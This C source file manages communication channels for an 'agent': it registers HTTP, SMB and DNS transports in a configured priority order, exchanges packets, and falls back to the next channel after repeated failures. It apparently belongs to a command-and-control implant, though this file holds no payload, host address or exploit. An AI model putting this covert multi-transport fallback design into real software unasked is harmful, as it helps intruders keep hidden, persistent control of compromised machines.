/*
 * channel_mgr.c — Channel abstraction and fallback management.
 *
 * Maintains an ordered list of communication channels. On repeated
 * failures, falls back to the next channel in priority order.
 */
#include "agent.h"

Channel g_channels[CHANNEL_MAX];
int g_active_channel = -1;
int g_channel_count = 0;

/* ─── Register available channels based on config ─── */

void channels_register(void) {
    g_channel_count = 0;

    /*
     * Parse CONFIG_CHANNEL_PRIORITY ("http,smb,dns") and register
     * channels in the specified order.
     */
    char priority[128];
    strncpy(priority, CONFIG_CHANNEL_PRIORITY, sizeof(priority) - 1);
    priority[sizeof(priority) - 1] = '\0';

    char *token = strtok(priority, ",");
    while (token && g_channel_count < CHANNEL_MAX) {
        /* Trim whitespace */
        while (*token == ' ') token++;
        char *end = token + strlen(token) - 1;
        while (end > token && *end == ' ') *end-- = '\0';

        if (strcmp(token, "http") == 0 || strcmp(token, "https") == 0) {
            g_channels[g_channel_count].type = CHANNEL_HTTP;
            g_channels[g_channel_count].name = "HTTP";
            g_channels[g_channel_count].init = http_init;
            g_channels[g_channel_count].cleanup = http_cleanup;
            g_channels[g_channel_count].send_recv = http_send_recv;
            g_channels[g_channel_count].initialized = FALSE;
            g_channels[g_channel_count].consecutive_failures = 0;
            g_channel_count++;
        }
        else if (strcmp(token, "smb") == 0) {
            g_channels[g_channel_count].type = CHANNEL_SMB;
            g_channels[g_channel_count].name = "SMB";
            g_channels[g_channel_count].init = smb_init;
            g_channels[g_channel_count].cleanup = smb_cleanup;
            g_channels[g_channel_count].send_recv = smb_send_recv;
            g_channels[g_channel_count].initialized = FALSE;
            g_channels[g_channel_count].consecutive_failures = 0;
            g_channel_count++;
        }
        else if (strcmp(token, "dns") == 0) {
            g_channels[g_channel_count].type = CHANNEL_DNS;
            g_channels[g_channel_count].name = "DNS";
            g_channels[g_channel_count].init = dns_init;
            g_channels[g_channel_count].cleanup = dns_cleanup;
            g_channels[g_channel_count].send_recv = dns_send_recv;
            g_channels[g_channel_count].initialized = FALSE;
            g_channels[g_channel_count].consecutive_failures = 0;
            g_channel_count++;
        }

        token = strtok(NULL, ",");
    }

    /* Default: HTTP if nothing configured */
    if (g_channel_count == 0) {
        g_channels[0].type = CHANNEL_HTTP;
        g_channels[0].name = "HTTP";
        g_channels[0].init = http_init;
        g_channels[0].cleanup = http_cleanup;
        g_channels[0].send_recv = http_send_recv;
        g_channels[0].initialized = FALSE;
        g_channels[0].consecutive_failures = 0;
        g_channel_count = 1;
    }

    g_active_channel = 0;
}

/* ─── Initialize the active channel ─── */

BOOL channel_init_active(void) {
    if (g_active_channel < 0 || g_active_channel >= g_channel_count)
        return FALSE;

    Channel *ch = &g_channels[g_active_channel];
    if (ch->initialized) return TRUE;

    if (ch->init()) {
        ch->initialized = TRUE;
        return TRUE;
    }
    return FALSE;
}

/* ─── Cleanup all channels ─── */

void channel_cleanup_all(void) {
    for (int i = 0; i < g_channel_count; i++) {
        if (g_channels[i].initialized) {
            g_channels[i].cleanup();
            g_channels[i].initialized = FALSE;
        }
    }
}

/* ─── Send/receive on the active channel ─── */

BOOL channel_send_recv(const unsigned char *packet, DWORD packet_len,
                       unsigned char **response, DWORD *response_len) {
    if (g_active_channel < 0 || g_active_channel >= g_channel_count)
        return FALSE;

    Channel *ch = &g_channels[g_active_channel];
    if (!ch->initialized) {
        if (!channel_init_active())
            return FALSE;
    }

    BOOL ok = ch->send_recv(packet, packet_len, response, response_len);
    if (ok) {
        ch->consecutive_failures = 0;
    } else {
        ch->consecutive_failures++;
    }
    return ok;
}

/* ─── Try fallback to next channel ─── */

BOOL channel_try_fallback(void) {
    if (g_channel_count <= 1) return FALSE;

    Channel *current = &g_channels[g_active_channel];
    if (current->consecutive_failures < CONFIG_CHANNEL_MAX_FAILURES)
        return TRUE; /* Not enough failures to trigger fallback */

    /* Try next channel */
    int next = (g_active_channel + 1) % g_channel_count;
    int tried = 0;

    while (tried < g_channel_count) {
        Channel *ch = &g_channels[next];

        /* Initialize if needed */
        if (!ch->initialized) {
            if (ch->init()) {
                ch->initialized = TRUE;
            } else {
                next = (next + 1) % g_channel_count;
                tried++;
                continue;
            }
        }

        g_active_channel = next;
        ch->consecutive_failures = 0;
        return TRUE;
    }

    return FALSE; /* All channels failed */
}
